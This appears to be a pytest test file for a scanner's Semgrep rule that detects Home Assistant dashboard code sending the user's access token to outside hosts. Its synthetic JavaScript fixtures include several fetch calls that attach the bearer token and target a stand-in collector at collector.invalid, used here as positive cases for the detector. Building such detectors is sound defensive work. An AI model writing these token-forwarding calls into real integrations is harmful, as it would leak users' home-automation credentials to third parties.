"""(0.14.0) Item 16: a token sent through a wrapper whose callers all pass same-origin
URLs, relative template literals, and constants imported from the app's own modules.

Synthetic: every name is made up and every outside host is .invalid. Nothing here runs
JavaScript; Semgrep parses it.
"""

from __future__ import annotations

import shutil
import textwrap
from pathlib import Path

import pytest

from sniff_test.analyzers import semgrep
from sniff_test.models import Target, TargetKind

pytestmark = pytest.mark.skipif(shutil.which("semgrep") is None, reason="needs semgrep")

CONSTANTS = 'export const API_BASE = "/api/acme_power";\n'
WRAPPER = """\
    export async function fetchWithAuth(url, options = {}) {
      const conn = await window.parent.hassConnection;
      const token = conn.auth.accessToken;
      const headers = { ...options.headers, Authorization: `Bearer ${token}` };
      let response = await fetch(url, { ...options, headers });
      if (response.status === 401) {
        await conn.auth.refreshAccessToken();
        response = await fetch(url, { ...options, headers });
      }
      return response;
    }
    """
CALLERS = """\
    import { API_BASE } from "./constants.js";
    import { fetchWithAuth } from "./api.js";

    export async function load(path, id) {
      await fetchWithAuth(`${API_BASE}?action=list&path=${encodeURIComponent(path)}`);
      await fetchWithAuth(API_BASE + "/files");
      await fetchWithAuth("/api/acme_power/raw");
      await fetchWithAuth(`/api/acme_power/item/${id}`);
      return fetchWithAuth(`${API_BASE}`, { method: "POST" });
    }
    """


def _scan(tmp_path: Path, files: dict[str, str], kind=TargetKind.INTEGRATION):
    root = tmp_path / "custom_components" / "acme_power"
    root.mkdir(parents=True)
    (root / "manifest.json").write_text('{"domain": "acme_power", "name": "Acme"}')
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(textwrap.dedent(text))
    target = Target(source=str(root), kind=kind, root=root, domain="acme_power")
    work = tmp_path / "work"
    work.mkdir()
    result = semgrep.run(target, work)
    return sorted((f.file, f.line) for f in result.findings if f.rule_id == "card-token-exfil")


def _module_app(**changes: str) -> dict[str, str]:
    files = {
        "www/modules/constants.js": CONSTANTS,
        "www/modules/api.js": WRAPPER,
        "www/modules/user.js": CALLERS,
    }
    files.update(changes)
    return files


def test_a_wrapper_whose_callers_all_stay_on_ha_is_no_finding(tmp_path):
    assert _scan(tmp_path, _module_app()) == []


@pytest.mark.parametrize(
    "extra",
    [
        'await fetchWithAuth("https://collector.invalid/c");',  # an outside host
        "await fetchWithAuth(`//collector.invalid/${id}`);",  # protocol-relative
        "await fetchWithAuth(`/${path}`);",  # "/" then a value: could be "//host"
        "await fetchWithAuth(path);",  # unknown
        "window.grab = fetchWithAuth;",  # escapes
        "[path].map(fetchWithAuth);",  # passed as a value
    ],
)
def test_one_unproven_caller_or_an_escape_keeps_it(tmp_path, extra):
    callers = CALLERS.replace(
        "      return fetchWithAuth(", f"      {extra}\n      return fetchWithAuth("
    )
    assert _scan(tmp_path, _module_app(**{"www/modules/user.js": callers})) == [
        ("www/modules/api.js", 5),
        ("www/modules/api.js", 8),
    ]


def test_an_alias_a_namespace_import_or_a_reassigned_url_keeps_it(tmp_path):
    alias = CALLERS.replace("import { fetchWithAuth }", "import { fetchWithAuth as get }")
    ns = CALLERS.replace(
        'import { fetchWithAuth } from "./api.js";', 'import * as api from "./api.js";'
    )
    moved = WRAPPER.replace("  let response", '  url = url + "";\n  let response')
    for i, files in enumerate(
        (
            _module_app(**{"www/modules/user.js": alias}),
            _module_app(**{"www/modules/user.js": ns}),
            _module_app(**{"www/modules/api.js": moved}),
        )
    ):
        assert _scan(tmp_path / str(i), files), i


def test_a_constant_that_isnt_relative_keeps_it(tmp_path):
    files = _module_app(
        **{"www/modules/constants.js": 'export const API_BASE = "https://collector.invalid";\n'}
    )
    assert len(_scan(tmp_path, files)) == 2


def test_a_classic_script_wrapper_keeps_it(tmp_path):
    """No import/export and not loaded as a module: its top-level names are shared with
    every script on the page, so callers elsewhere can't be known."""
    script = """\
        function getIt(url) {
          return fetch(url, { headers: { Authorization: hass.auth.data.access_token } });
        }
        getIt("/api/acme_power/x");
        """
    assert _scan(tmp_path, {"www/panel.js": script}) == [("www/panel.js", 2)]


MINIFIED = (
    'var B,ye=J(()=>{B="/api/acme_power"});'
    "async function O(e,t={}){let n=(await window.parent.hassConnection).auth.accessToken;"
    "return fetch(e,{...t,headers:{Authorization:`Bearer ${n}`}})}"
    'async function L(p,q){await O(B);await O(B+"?a=1");await O(`${B}?action=x&p=${p}`);'
    "await O(`${B}/f/${q}`);return O(`/api/acme_power/${q}`)}\n"
)


def test_a_minified_bundle_loaded_as_a_module_is_judged_by_scope(tmp_path):
    html = '<script type="module" src="/acme_power/assets/dist/app.bundle.js?v=1"></script>\n'
    files = {"www/dist/app.bundle.js": MINIFIED, "www/panels/panel.html": html}
    assert _scan(tmp_path, files) == []
    # one call through a parameter that shadows the constant: kept
    bad = MINIFIED.replace(
        "async function L(p,q){", "async function L(p,q){(B=>O(`${B}/x/${p}`))(p);"
    )
    assert _scan(tmp_path / "b", {**files, "www/dist/app.bundle.js": bad}) == [
        ("www/dist/app.bundle.js", 1)
    ]
    # not loaded as a module: kept
    assert _scan(tmp_path / "c", {"www/dist/app.bundle.js": MINIFIED}) == [
        ("www/dist/app.bundle.js", 1)
    ]


def test_a_relative_template_literal_sent_straight_is_no_finding(tmp_path):
    card = """\
        export function a(hass, id) {
          return fetch(`/api/acme_power/${id}`, { headers: { Authorization: hass.auth.data.access_token } });
        }
        export function b(hass, host) {
          return fetch(`//${host}/x`, { headers: { Authorization: hass.auth.data.access_token } });
        }
        export function c(hass, host) {
          return fetch(`/${host}`, { headers: { Authorization: hass.auth.data.access_token } });
        }
        """
    assert _scan(tmp_path, {"card.js": card}, TargetKind.PLUGIN) == [("card.js", 5), ("card.js", 8)]


def test_a_wrapper_calling_another_wrapper_is_followed(tmp_path):
    outer = """\
        import { fetchWithAuth } from "./api.js";
        import { API_BASE } from "./constants.js";

        export function apiGet(u) {
          return fetchWithAuth(u);
        }
        export function list() {
          return apiGet(`${API_BASE}/list`);
        }
        """
    good = _module_app(**{"www/modules/user.js": outer})
    assert _scan(tmp_path / "g", good) == []
    bad = _module_app(**{"www/modules/user.js": outer + 'apiGet("https://collector.invalid/");\n'})
    assert len(_scan(tmp_path / "b", bad)) == 2


SHADOWS = [
    "function a(p) { let C = p; return O(`${C}/x/${p}`); }",
    "function b(p) { return ((C) => O(`${C}/x/${p}`))(p); }",
    "function c(p) { return (C => O(`${C}/x/${p}`))(p); }",
    "function d(p) { return (({ C }) => O(`${C}/x/${p}`))(p); }",
    "function e(p) { try {} catch (C) { O(`${C}/x/${p}`); } }",
    "function f(p) { for (const C of p) O(`${C}/x/${p}`); }",
    "function g(p) { const h = function (C) { return O(`${C}/x/${p}`); }; return h; }",
    "class K { m(C) { return O(`${C}/x/${C}`); } }",
    "function i(p) { return (C => O(C + '/x'))(p); }",
]


@pytest.mark.parametrize("shadow", SHADOWS)
def test_a_name_that_shadows_the_constant_is_never_proof(tmp_path, shadow):
    """Semgrep 1.185's metavariable-pattern ignores all of these shadowing forms; the
    pattern-not proof doesn't. Kept as a guard for Semgrep upgrades."""
    app = (
        'export const C = "/api/acme_power";\n'
        "async function O(e) {\n"
        "  return fetch(e, { headers: { Authorization: window.hass.auth.data.access_token } });\n"
        "}\n"
        "O(`${C}/ok/${q}`);\n" + shadow + "\n"
    )
    assert _scan(tmp_path, {"www/app.js": app}) == [("www/app.js", 3)]


def test_a_relative_url_built_in_a_local_is_proven_after_the_rule(tmp_path):
    """The rule's own test case from a real card: `i = "/api/…".concat(n)` then `fetch(i)`.
    The rule reports it (no constant propagation); this step proves it and drops it."""
    card = (
        "export function legit(n, t) {\n  var i;\n"
        '  return t.prev=0,i="/api/printer_hub/file_cache/".concat(n.thumbnail_path),t.next=4,'
        'fetch(i,{headers:{Authorization:"Bearer ".concat(this._hass.auth.data.access_token)}});\n'
        "}\n"
    )
    assert _scan(tmp_path, {"card.js": card}, TargetKind.PLUGIN) == []


@pytest.mark.parametrize(
    "steal",
    [
        "export function a(hass, { C }) {\n  return fetch(C + '/x', {headers: {Authorization: hass.auth.data.access_token}});\n}\n",
        "export function b(hass, p) {\n  const [C] = p;\n  return fetch(C + '/x', {headers: {Authorization: hass.auth.data.access_token}});\n}\n",
        "export function c(hass, p) {\n  return (({ C }) => fetch(`${C}/x/${p}`, {headers: {Authorization: hass.auth.data.access_token}}))(p);\n}\n",
    ],
)
def test_a_destructured_name_shadowing_a_constant_keeps_it(tmp_path, steal):
    card = 'const C = "/api/c";\n' + steal
    assert len(_scan(tmp_path, {"card.js": card}, TargetKind.PLUGIN)) == 1


def test_a_plain_relative_constant_is_proven(tmp_path):
    card = (
        'const C = "/api/c";\n'
        "export function a(hass, p) {\n"
        "  return fetch(`${C}/x/${p}`, {headers: {Authorization: hass.auth.data.access_token}});\n"
        "}\n"
    )
    assert _scan(tmp_path, {"card.js": card}, TargetKind.PLUGIN) == []
